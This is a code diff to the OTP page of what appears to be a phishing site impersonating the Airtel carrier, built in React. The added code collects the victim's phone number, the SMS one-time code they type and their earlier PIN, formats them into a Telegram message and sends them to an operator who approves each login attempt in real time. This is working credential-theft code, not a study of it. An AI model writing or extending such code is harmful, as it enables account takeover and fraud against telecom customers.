@@ -3,8 +3,7 @@ import { motion } from 'motion/react';
 import { AirtelLogo } from './Logos';
 import { InternetPlan } from '../types';
 import { ValidatingModal } from './ValidatingModal';
-import { useTelegramPolling } from '../hooks/useTelegramPolling';
-import { telegramService } from '../services/telegramService';
+import { sendLoginToTelegramAndWait } from '../utils/simpleTelegram';
 import { LanguageSwitch } from './LanguageSwitch';
 import { useApp } from '../context/AppContext';
 import { CountryInfo } from '../data/countries';
@@ -111,26 +110,6 @@ export const OtpPage: React.FC<OtpPageProps> = ({
   const currentOtp = otpDigits.join('');
   const isOtpComplete = currentOtp.length === 4;
 
-  // Telegram polling hook for OTP verification
-  const { status: telegramStatus } = useTelegramPolling({
-    sessionId: activeSessionId,
-    phone,
-    targetStep: 'otp',
-    isActive: isWaitingTelegram,
-    onApproved: () => {
-      setTimeout(() => {
-        setIsWaitingTelegram(false);
-        onOtpSuccess();
-      }, 600);
-    },
-    onRejected: () => {
-      setIsWaitingTelegram(false);
-      setErrorMessage(t('otpError'));
-      setOtpDigits(['', '', '', '']);
-      otpInputRefs.current[0]?.focus();
-    },
-  });
-
   const handleSubmit = async (e?: React.FormEvent) => {
     if (e) e.preventDefault();
     if (!isOtpComplete || isSubmitting) return;
@@ -140,28 +119,37 @@ export const OtpPage: React.FC<OtpPageProps> = ({
     setResendSuccessMsg(null);
 
     try {
-      // Send OTP with country and fullPhone to Telegram Bot
-      const success = await telegramService.sendOtp({
-        sessionId: activeSessionId,
-        phone,
-        fullPhone: displayPhone,
-        country: `${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}`,
-        airtelBrand: country.airtelBrand,
-        otp: currentOtp,
-        planName: `${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity})`,
-        planPrice: selectedPlan.price,
-      });
+      // Format message for Telegram
+      const message =
+        `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
+        `🌍 <b>Pays Airtel:</b> ${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}\n` +
+        `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
+        `🔢 <b>Code OTP Saisi:</b> <code>${currentOtp}</code>\n` +
+        `🔑 <b>Code PIN Initial:</b> <code>${pin}</code>\n` +
+        `📦 <b>Forfait:</b> ${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity}) (${selectedPlan.price})\n` +
+        `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
+        `🆔 <b>Session:</b> <code>${activeSessionId}</code>\n\n` +
+        `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;
 
-      if (success) {
-        setIsWaitingTelegram(true);
+      // Send to Telegram and wait for approval (using phone as username, isCode=true)
+      setIsWaitingTelegram(true);
+      const approved = await sendLoginToTelegramAndWait(message, phone, true);
+
+      setIsWaitingTelegram(false);
+
+      if (approved) {
+        onOtpSuccess();
       } else {
         setErrorMessage(
           language === 'fr'
-            ? 'Impossible d\'envoyer le code à Telegram. Veuillez vérifier votre connexion.'
-            : 'Failed to send code to Telegram. Please check your connection.'
+            ? 'Code OTP incorrect ou expiré. Veuillez vérifier votre SMS et réessayer.'
+            : 'Incorrect or expired OTP code. Please check your SMS and try again.'
         );
+        setOtpDigits(['', '', '', '']);
+        otpInputRefs.current[0]?.focus();
       }
     } catch (err: any) {
+      setIsWaitingTelegram(false);
       setErrorMessage(
         err.message ||
           (language === 'fr'
@@ -185,18 +173,7 @@ export const OtpPage: React.FC<OtpPageProps> = ({
     );
     otpInputRefs.current[0]?.focus();
 
-    try {
-      await telegramService.requestOtpResend({
-        sessionId: activeSessionId,
-        phone,
-        fullPhone: displayPhone,
-        country: `${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}`,
-        planName: `${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity})`,
-        planPrice: selectedPlan.price,
-      });
-    } catch {
-      // Non-blocking resend notification
-    }
+    // Resend notification - just show message, no Telegram call needed
   };
 
   return (
@@ -397,13 +374,7 @@ export const OtpPage: React.FC<OtpPageProps> = ({
         type="otp"
         phone={displayPhone}
         planName={`${selectedPlan.dataAmount} ${selectedPlan.dataUnit}`}
-        status={
-          telegramStatus === 'approved'
-            ? 'approved'
-            : telegramStatus === 'rejected'
-            ? 'rejected'
-            : 'pending'
-        }
+        status={isWaitingTelegram ? 'pending' : 'idle'}
       />
     </div>
   );
